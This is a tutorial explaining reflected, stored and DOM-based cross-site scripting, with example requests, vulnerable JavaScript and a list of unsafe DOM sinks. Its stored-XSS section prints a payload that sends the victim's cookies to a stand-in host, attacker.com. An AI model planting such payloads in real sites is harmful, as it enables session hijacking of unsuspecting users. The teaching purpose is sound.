##  Types of XSS

There are **three main types** of Cross-Site Scripting (XSS) attacks:

1. Reflected XSS (Non-Persistent)
2. Stored XSS (Persistent)
3. DOM-Based XSS (Client-Side Only)

Each type works differently based on:

* **How the payload is delivered**
* **Where it is executed**
* **Whether the vulnerability lies in the server or in the browser (DOM)**

---

## 1. Reflected XSS (Non-Persistent)

### Description

* The payload is reflected **immediately** from the HTTP request back to the response.
* The server takes input (e.g., from query strings, headers, or form data) and returns it without proper sanitization.
* The malicious code is **not stored** — it exists only for that session.
* This attack works only if the **victim is tricked** into clicking a malicious link or submitting a form.

### How it Works

1. Attacker creates a malicious link with a JavaScript payload in a parameter.
2. Victim clicks the link.
3. Server reflects the unsanitized input into the response page.
4. The browser executes the script in the context of the vulnerable application.

### Example

```http
GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: example.com
```

Response:

```html
You searched for: <script>alert(1)</script>
```

### Characteristics

*  **Not stored** on the server
*  **Requires user interaction** (click or request submission)
*  **Executed in the browser** (from server reflection)
*  Common in:

  * Search results
  * Error messages
  * Login forms
  * Redirect URLs

---

## 2. Stored XSS (Persistent)

### Description

* The malicious script is **permanently stored** on the backend (e.g., in a database or file).
* The script is injected by an attacker and later included in a server response viewed by other users.
* Victims don’t need to click anything — the attack **triggers automatically** when the page loads.

### How it Works

1. Attacker submits a payload in a comment, message, profile, etc.
2. The server stores this payload in persistent storage.
3. When another user views the affected page, the stored script is served as normal content.
4. The browser executes the script automatically.

### Example

```html
<script>fetch('https://attacker.com?cookie=' + document.cookie)</script>
```

When injected into a comment or profile, this payload will steal cookies from other users.

### Characteristics

*  **Stored permanently** in the backend
*  **No interaction needed** by the victim
*  **Executed in the browser** (as part of normal page load)
*  **High impact**, especially when exposed to admins or large user bases
*  Common in:

  * Blog comments
  * Forums
  * User profiles
  * Chat applications

---

## 3. DOM-Based XSS

### Description

* The vulnerability lies in **client-side JavaScript**, not in server behavior.
* JavaScript in the page processes data (e.g., from `location`, `document.URL`, `cookies`) and inserts it into the DOM without sanitization.
* The browser directly executes the script injected via the DOM.

### How it Works

1. Attacker crafts a URL with a payload in the hash (`#`), query (`?`), or another client-side source.
2. The JavaScript reads this value and injects it into the page using unsafe DOM manipulation.
3. The browser executes the injected script.

### Example

```javascript
var name = location.hash.substring(1);
document.getElementById("output").innerHTML = "Hello " + name;
```

If you visit:

```
https://example.com/#<img src=x onerror=alert(1)>
```

Then this renders:

```html
Hello <img src=x onerror=alert(1)>
```

…and triggers the `alert(1)` execution.

### Characteristics

*  **Not stored** anywhere
*  **Requires a crafted URL or user-controlled DOM data**
*  **Executed entirely on the frontend (DOM only)**
*  Often missed by basic vulnerability scanners
*  Common in Single Page Applications (SPAs) using frameworks like React, Vue, Angular

### Common Vulnerable Sinks (DOM XSS)

* `element.innerHTML`
* `element.outerHTML`
* `document.write()`
* `document.writeln()`
* `eval()`
* `setTimeout("code", ...)` *(string form)*
* `setInterval("code", ...)` *(string form)*
* `element.setAttribute(...)`
* `location.href = untrusted_input`

---

##  Summary

| Type      | Key Idea                                                                        |
| --------- | ------------------------------------------------------------------------------- |
| Reflected | Script is echoed directly from user input to the server response                |
| Stored    | Script is stored in backend and shown to every user who loads the affected page |
| DOM-Based | Script is inserted by insecure frontend JavaScript using untrusted client data  |

---
